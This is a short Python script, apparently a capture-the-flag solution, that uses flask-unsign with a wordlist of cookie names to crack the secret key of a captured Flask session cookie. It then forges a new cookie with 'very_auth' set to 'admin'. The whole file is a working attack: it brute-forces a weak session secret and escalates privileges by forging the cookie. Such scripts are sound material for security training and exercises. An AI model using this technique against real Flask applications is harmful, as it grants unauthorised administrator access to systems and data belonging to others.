import os
import subprocess
import flask_unsign  # to check if lib is installed, not used in this file

session_cookie = 'eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YmEdkQ.orWM-4JqpGMh8VuCJFHisRo1tDE'  # copy from dev tools
word_list = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
word_list_filename = 'wordlist'
admin_cookie = "{'very_auth':'admin'}"

with open(word_list_filename, 'w+') as f:
    f.write('\n'.join(word_list))

r = subprocess.check_output(f'flask-unsign --unsign --cookie {session_cookie} --wordlist {word_list_filename}')
key = r.splitlines()[-1].decode()  # get the secret key
print(f'Found secret key: {key}')

r = subprocess.check_output(fr'flask-unsign --sign --cookie "{admin_cookie}" --secret {key}')
r = r.splitlines()[-1].decode()
print(f'Admin cookie: {r}')
os.remove(word_list_filename)
